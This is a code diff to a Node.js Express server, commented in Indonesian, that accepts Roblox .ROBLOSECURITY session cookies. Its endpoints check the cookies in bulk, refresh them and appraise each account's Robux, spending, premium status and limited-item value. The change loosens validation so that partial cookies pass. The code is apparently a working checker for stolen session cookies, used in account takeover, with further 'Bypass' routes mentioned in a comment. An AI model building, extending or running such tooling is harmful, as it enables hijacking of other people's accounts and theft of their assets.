@@ -8,8 +8,18 @@ app.use(cors());
 app.use(express.json());
 
 const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
+
+// Fungsi buat bersihin cookie (buang _|WARNING kalau ada, atau bersihin spasi)
+const cleanCookie = (cookie) => {
+    if (!cookie) return '';
+    let c = cookie.trim();
+    // Kalau ada _|WARNING di depan, biarin aja (Roblox butuh ini)
+    // Tapi kalau cuma potongan, tetep kita kirim apa adanya.
+    return c;
+};
+
 const makeHeaders = (cookie) => ({
-    'Cookie': `.ROBLOSECURITY=${cookie}`,
+    'Cookie': `.ROBLOSECURITY=${cleanCookie(cookie)}`,
     'User-Agent': UA,
     'Accept': 'application/json'
 });
@@ -18,7 +28,11 @@ const router = express.Router();
 
 router.post('/check-cookie', async (req, res) => {
     const { cookie } = req.body;
-    if (!cookie || !cookie.startsWith('_|WARNING')) return res.status(400).json({ valid: false, error: 'Format invalid.' });
+    // Cek minimal panjang cookie, jangan cek format WARNING
+    if (!cookie || cookie.length < 50) {
+        return res.status(400).json({ valid: false, error: 'Cookie terlalu pendek / kosong.' });
+    }
+    
     const headers = makeHeaders(cookie);
     
     try {
@@ -45,12 +59,10 @@ router.post('/check-cookie', async (req, res) => {
         
         let rap = 0, limitedCount = 0, topLimited = [];
         
-        // 1. Ambil Inventory (Max 100 item biar gak timeout)
         try {
             const invRes = await axios.get(`https://inventory.roblox.com/v2/users/${user.id}/inventory/3?limit=100&sortOrder=Desc`, { headers, timeout: 8000 });
             const assets = invRes.data?.data || [];
             
-            // Ambil detail aset (batched 10)
             for (let i = 0; i < assets.length; i += 10) {
                 const batch = assets.slice(i, i + 10);
                 await Promise.all(batch.map(async (a) => {
@@ -64,8 +76,7 @@ router.post('/check-cookie', async (req, res) => {
                             const itemRap = rapRes.data?.recentAveragePrice || 0;
                             rap += itemRap;
                             
-                            // Simpan top limited buat ditampilin gambarnya
-                            if (topLimited.length < 5) {
+                            if (topLimited.length < 6) {
                                 topLimited.push({
                                     name: data.Name,
                                     rap: itemRap,
@@ -78,10 +89,9 @@ router.post('/check-cookie', async (req, res) => {
             }
         } catch (e) {}
 
-        // 2. Ambil Top Games (Playtime & Spend)
         let topGames = [];
         try {
-            const gamesRes = await axios.get(`https://games.roblox.com/v2/users/${user.id}/games?accessFilter=Public&limit=5&sortOrder=Desc`, { headers, timeout: 8000 });
+            const gamesRes = await axios.get(`https://games.roblox.com/v2/users/${user.id}/games?accessFilter=Public&limit=6&sortOrder=Desc`, { headers, timeout: 8000 });
             const games = gamesRes.data?.data || [];
             topGames = games.map(g => ({
                 name: g.name,
@@ -96,18 +106,18 @@ router.post('/check-cookie', async (req, res) => {
             telemetry: { robux, premium, spend, rap, limitedCount, topLimited, topGames }
         });
     } catch (e) {
-        if (e.response && (e.response.status === 401 || e.response.status === 403)) return res.status(401).json({ valid: false, error: 'Cookie invalid / expired.' });
+        if (e.response && (e.response.status === 401 || e.response.status === 403)) return res.status(401).json({ valid: false, error: 'Cookie tidak valid / expired.' });
         res.status(500).json({ valid: false, error: 'Gagal hubungi Roblox.' });
     }
 });
 
-// Mass Check, Refresh, Tax, Lookup, Bypass (Sama kayak sebelumnya)
+// Mass Check, Refresh, Tax, Lookup, Bypass
 router.post('/mass-check', async (req, res) => {
     const { cookies } = req.body;
     if (!Array.isArray(cookies) || cookies.length === 0) return res.status(400).json({ error: 'Kirim array cookies.' });
     if (cookies.length > 30) return res.status(400).json({ error: 'Max 30 cookie.' });
     async function checkOne(cookie) {
-        if (!cookie || !cookie.startsWith('_|WARNING')) return { valid: false, error: 'Format invalid' };
+        if (!cookie || cookie.length < 50) return { valid: false, error: 'Format invalid' };
         const headers = makeHeaders(cookie);
         try {
             const authRes = await axios.get('https://users.roblox.com/v1/users/authenticated', { headers, timeout: 8000 });
@@ -131,7 +141,7 @@ router.post('/mass-check', async (req, res) => {
 
 router.post('/refresh-cookie', async (req, res) => {
     const { cookie } = req.body;
-    if (!cookie) return res.status(400).json({ error: 'Cookie kosong' });
+    if (!cookie || cookie.length < 50) return res.status(400).json({ error: 'Cookie kosong / terlalu pendek' });
     const headers = { ...makeHeaders(cookie), 'Referer': 'https://www.roblox.com/' };
     try {
         const authRes = await axios.get('https://users.roblox.com/v1/users/authenticated', { headers, timeout: 10000 });
